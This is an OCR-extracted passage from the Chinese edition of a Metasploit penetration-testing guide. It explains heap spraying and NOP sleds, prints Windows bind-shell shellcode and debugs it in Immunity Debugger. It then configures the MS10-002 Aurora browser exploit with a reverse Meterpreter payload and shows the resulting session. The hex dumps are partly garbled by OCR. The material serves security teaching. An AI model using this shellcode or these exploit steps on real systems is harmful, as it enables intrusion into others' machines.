这里有个需要注意的关键点：如果目标用户是以管理员权限运行应用程序，那么攻击者将
获得同样的权限。基于客户端的渗透攻击将很自然地获得被溢出目标程序的运行用户账户权限。
如果上述的目标用户是普通用户，那么我们需要进行本地提权操作来获得更高权限，这意味着
需要进行另一个溢出攻击。我们也可以寄希望于攻击这个网络中的其他系统主机，来获得管理
员权限。在很多的情况下，当前用户权限能否足以使我们达到渗透的目的，这主要取决于在网
络中用户账户是否能够访问重要数据？或者只有管理员账户才可以访问这些数据？
110
---
## Page 138
第8章客户端渗透攻击
8.1.1基于浏览器的渗透攻击原理
针对浏览器的渗透攻击区别于其他传统渗透攻击的最大不同在于shellcode的触发执行方
式。在传统的渗透攻击中，攻击者的全部目标就是获取远程代码执行的机会，然后植入一个恶
意的攻击载荷。然而在浏览器渗透攻击中，为了能够执行特殊构造的攻击载荷代码，通常利用
一种被称为堆喷射（heap spraying）的漏洞利用技术。在详细讨论堆喷射技术之前，我们先来看
看什么是堆，以及它是如何工作的。
堆是指用于动态分配的进程内存空间，应用程序在运行时按需对这段内存进行申请和使用。
应用程序会根据需求，将一块内存空间分配给正在处理的任务。而堆空间的大小则取决于计算
机的可用内存空间，以及在应用软件生命周期中已经使用的内存空间。在程序的运行过程中，
对于攻击者而言，内存的分配地址是未知的，所以我们不知道shellcode在内存中的确切位置。
由于堆的内存地址分配是随机的，所以攻击者不能简单地跳转至一个内存地址，且寄希望于这
个地址正好是攻击载荷的起始位置。在堆喷射技术被提出来之前，这种随机性是攻击者面临的
主要挑战之一。
在继续下面的讨论之前，你必须了解这两个概念：空指令（NOP）和空指令滑行区（NOP
堆喷射的工作机理。空指令是指这样一类汇编指令：不做任何事情，继续执行下一条指令。空
指令着陆区是指内存中由很多条紧密相连的空指令所构成的一个指令区域。如果程序在执行过
程中遇到一连串的空指令，那么他会顺序“滑过”这段空指令区域到指令块的末尾，去执行该
块指令之后的下一条指令。在Intelx86架构中，一个空指令对应的操作码是90，经常以\x90的
形式出现在渗透代码中。
堆喷射技术是指将空指令滑行区与shellcode组合成固定的形式，然后将它们重复填充到堆
中，直到填满一大块内存空间。由前面所述可知，堆中的内存分配是在程序运行时动态执行的，
所以我们通常利用浏览器在执行JavaScript脚本时去申请大量内存。攻击者将用空指令滑行区
和紧随其后的shellcode填充大块的内存区域。当程序的执行流被改变后，程序将会随机跳转到
也会随之执行。相比较于在内存中寻找shellcode地址像大海捞针般困难，堆喷射成功溢出的概
率能够达到85%至90%
这个技术改变了浏览器渗透攻击的方式，大大提升了浏览器漏洞利用的可靠性。我们将不
会去讨论执行堆喷射的具体实际代码，因为这是一个高级的渗透攻击专题，但是你必须知道使
得这些浏览器渗透攻击成功运行的基础原理。在动手执行第一个浏览器渗透攻击之前，我们来
看看在渗透攻击的背后，到底都发生了些什么？
111
---
## Page 139
Metasploit渗透测试指南
8.1.2空指令
在了解了堆喷射技术和空指令的基础知识之后，我们来看一个实际渗透攻击中通过空指令
滑行区的例子。在下面的列表中，十六进制的表达式ix90是Intelx86架构下的操作码。在Intel
x86汇编中，一个90代表一条空指令。在这里，我们看到一连串的x90构成了一个滑行区，紧
随其后的是攻击载荷代码，这个载荷可以是一个反弹式命令行shell，或是一个Meterpretershell。
1x901x901x901x901x901x901x901x901x901x901x901x901x901x901x90
1x901x90\x901x901x901x901x901x901x901x901x90x901x90\x901x90
1x901x901x901x90/x90/x90\x90\x901x901x901x90\x901x90\x90/x90
1xfc1xe81x89/x00/x00\x00\x60\x89\xe51x31\xd2\x64\x8b\x52\x30
\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff
1x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2
\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85
xc0\x74\x4ax01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3xe3
\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d
\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58
x8b\x58\x24\x01\xd3/x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3/x8b
\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59/x5a\x51\xff
1xe0/x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32/x00\x00/x68
x77\x73/x32/x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01
1x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5/x50\x50
1x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x31
1xdb\x53/x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\xc2
1xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5\x53
x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d
1x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff
1xd51x8b/x36\x6a\x40\x68\x00/x10\x00\x00\x56\x6a\x00\x68\x58
1xa4\x53\xe51xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9
1xc8/x5f\xff\xd51x011xc31x291xc61x851xf61x751xec\xc3
8.2使用Immunity调试器来揭秘空指令机器码
调试器提供一个窗口，可以用来获得关于进程的运行状态，包括汇编指令流、内存数据，
以及异常处理的细节。渗透测试人员利用调试器的基本用途是获得关于0day漏洞的细节，了解
应用程序如何工作，以及如何去攻击它。调试器有很多种，我们个人比较喜欢使用的是Immunity
调试器（后面的各章中会使用到）。在继续下面的内容之前，我们建议你能对Immunity调试器
有个大概的了解。
为了明白一个空指令滑行区是如何运行的，我们可以用调试器来察看先前例子中的空指令
机器码是如何执行的。对于-台WindowsXP目标主机，你可以从http://www.immunity
inc.com/网站下载Immunity调试器并安装。我们通过执行msfpayload功能程序来生成一个简单
的shellcode程序，提供绑定监听在TCP443端口的shell连接，如下所示。正如你在前面章节
中所了解的那样，一个绑定shell是指在目标主机上监听一个端口，我们可以通过连接这个端口，
112
---
## Page 140
第8章客户端渗透攻击
获取该主机的shell控制会话。
当执行这些命令之后，Metasploit将会输出两个shellcode，分别可以称为是“第一阶段”和
“第二阶段”的shellcode。我们只关心处于第一阶段的shellcode，因为当第一阶段shellcode所
打开的端口有连接请求时，Metasploit会替我们将第二阶段的shellcode发送到这个连接上。你
可以将第一阶段的shellcode复制粘贴到你所选择的文本编辑器中，然后在继续下面的工作之
前做些细微的文本编辑。
现在你已经有了一个基本的shellcode，然后你可以在这个shellcode的前面加上很多空指令
（例如x90\x90x90\x90\x90）。将所有的\x移除之后，如下所示：
909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090f
ce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2t0
52578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cfod01c
738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe058
5f5a8b12eb865d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504
050405068ea0fdfe0ffd59731db5368020001bb89e66a10565768c2db3767ffd5535768b7e938ffffd553535768
74ec3be1ffd5579768756e4d61ffd56a006a0456576802d9c85fffd58b366a406800100000566a006858a453e5f
fd593536a005653576802d9c85fffd501c329c685f675ecc3
上面的这些操作是必须的，因为你必须将拷贝粘贴的汇编指令转换成Immunity调试器可以
接受的格式。现在你已经有了一个包含空指令的绑定shell来进行测试了。接下来，打开任一个
可执行程序，在这里以iexplore.exe为例。首先打开Immunity调试器，选择File菜单中的Open
指令。
将前面提到的shellcode复制到剪贴板，然后在Immunity调试窗口中用鼠标右键点击选择
Binary选项中的Binarypaste。这样会将上述列子中的汇编指令粘贴到Immunity的调试窗口中。
（需要注意的是，我们这样做的目的只是要搞清楚空指令和汇编指令是如何执行的。）
你可以在图8-1中看到一些被插入的空指令，如果往下滚动屏幕，将会看到你的shellcode。
当我们第一次输出bind_tcp格式的shellcode时，可以看到第一阶段的结束指令是ecc3。在
内存中定位这个以ecc3结束的指令块。
1
在紧接ecc3之后，按F2设置一个断点。在设置了断点之后，程序的执行流遇到这个断点
之后将会暂停执行而不是继续。这个断点在这里是非常重要的，因为我们用调试器打开的应用
我们必须在程序崩溃之前使它停下来，研究到底发生了什么。
113
---
## Page 141
Metasploit渗透测试指南
HOP
HOP
HOF
OE
图8-1由许多空指令组成的空指令滑行区
如图8-2所示，以c3结尾的指令块是我们的绑定shell中最后一个指令块。
在c3指令之后，按F2键设置断点。现在我们准备开始执行去查看发生了什么。回到前面
加入空指令的指令区域顶端，然后按F7键。这代表命令调试器执行一条汇编命令，执行之后
前进到下一条汇编指令。我们注意到在执行之后，下一行指令变成高亮显示。但是程序什么也
没有做，因为这是一条你添加的空操作指令。
紧接着，在按F7键若干次之后，程序执行完整个空指令滑行区。当你第一次执行到内存
中的shellcode指令时，打开一个命令行终端并输入命令netstat-an。现在应该没有任何进程监
听在443端口上，这也说明你的攻击载荷还未被执行到。
按下F5键，调试器将会允许程序去执行后续指令直至碰到你所设置的断点。你将会在
Immunity调试器窗口的左下角看到断点提示。此时，附加了调试器的程序已经执行了你的攻击
载荷，你现在可以通过netstat-an查看到443端口已经被打开并处于监听状态。
在一个远程主机上，用telnet来连接目标主机的443端口，你会发现没有任何事情发生。
这是因为监听程序没有收到来自Metasploit的第二阶段shellcode。在你的BackTrack虚拟机中，
运行Metasploit，然后设置一个多线程监听器。这会告诉Metasploit在目标主机的443端口上已
而获取到控制会话。
114
---
## Page 142
第8章客户端渗透攻击
EA
CALLCOF
.EDI
0200000
0010002
CALL
PUSH
7E4E4D1
ESI
0209C857
HOESI.MODPTRDS:ES11
0902
EA
图8-2我们所需要的指令块中的最后一部分
msf>use multi/handler
msfexploit(handler)>set payloadwindows/shell/bind_tcp
payload => windows/shell/bind_tcp
msf exploit(handler)> set LPORT 443
LPORT=>443
msfexploit(handler)>setRH0ST192.168.33.130
RHOST => 192.168.33.130
msfexploit(handler)>exploit
[*]Starting the payload handler..
[*]Started bind handler
[*] Sending stage (240 bytes)
[*]Command shel1 session 1 opened(192.168.33.129:60463 ->192.168.33.130:443)
通过上面的命令设置，你将会得到一个基本的命令行shell！作为一个很好的练习，你可以
尝试执行一个反弹式的第一阶段Meterpreter shell，然后看看是否能得到一个控制连接。在完成
这些之后，你可以关掉你的Immunity调试器窗口，搞定收工。到目前为止，重要的是你熟悉了
Immunity调试器，我们将会在随后的几章中使用它。现在，让我们开始第一次实施利用堆喷射
技术的浏览器渗透攻击。
115
---
## Page 143
Metasploit渗透测试指南
8.3对IE浏览器的极光漏洞进行渗透利用
你现在已经知道堆喷射技术的工作原理，以及如何来动态申请内存并填充堆内存空间，使
攻击案例是著名的极光漏洞（微软安全公告编号是MS10-002）。这个漏洞被攻击者用来渗透包括
Google在内的二十多家大型技术公司，而使之臭名远扬。尽管这个漏洞的渗透利用在2010年初
就被公布，但是它还是值得我们进行回顾分析，毕竟它让IT工业界的很多知名公司都裁了跟头。
开始时，我们首先进入Metasploit中的极光漏洞渗透攻击模块，然后设置我们选择的攻击
载荷。下面的命令你应该很熟悉，因为我们在前面的章节中都已经使用过。对于那些你所不熟
悉的新出现的命令选项，我们将会做详细说明。
msf>use windows/browser/ms10_o02_aurora
msf exploit(ms10_o02_aurora)>set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms10_o02_aurora)>showoptions
Module options:
Name
Current Setting
RequiredDescription
SRVHOST
0.0.0.00
yes
The local host to listen on.
SRVPORT
8080@
yes
The local port to listen on.
SSL
false
no
Negotiate SSL for incoming connections
SSLVersionSSL3
no
Specify theversion of SSL that should be used
(accepted:SSL2，SSL3，TLS1)
URIPATH ③
no
The URI to use for this exploit (default is random)
Payload options (windows/meterpreter/reverse_tcp):
Name
Current Setting
Required
1Description
EXITFUNC
process
yes
Exit technique: seh,thread,process
LHOST
yes
The local address
LPORT
4444
yes
The local port
Exploit target:
IdName
0
Automatic
msfexploit(ms10_002_aurora)>set SRVPoRT 80
SRVPORT =>80
msf exploit(ms10_002_aurora）>set URIPATH/@
URIPATH =>/
116
---
## Page 144
第8章客户端渗透攻击
msf exploit(ms10_002_aurora)>setLH0ST192.168.33.129
LHOST => 192.168.33.129
msf exploit(ms10_002_aurora)>setLP0RT 443
LPORT =>443
msf exploit(ms10_002_aurora)>exploit-z
[*]Exploit running as background job.
msf exploit(ms10_002_aurora)>
[*]Started reverse handler on 192.168.33.129:443
[*]UsingURL:http://0.0.0.0:80/
[*]Local IP:http://192.168.33.129:80/
[*]Serverstarted.
msf exploit(ms10_002_aurora)>
首先，参数SRVHOSTO的默认设置是0.0.0.0：这意味着将把Web服务绑定在所有的网卡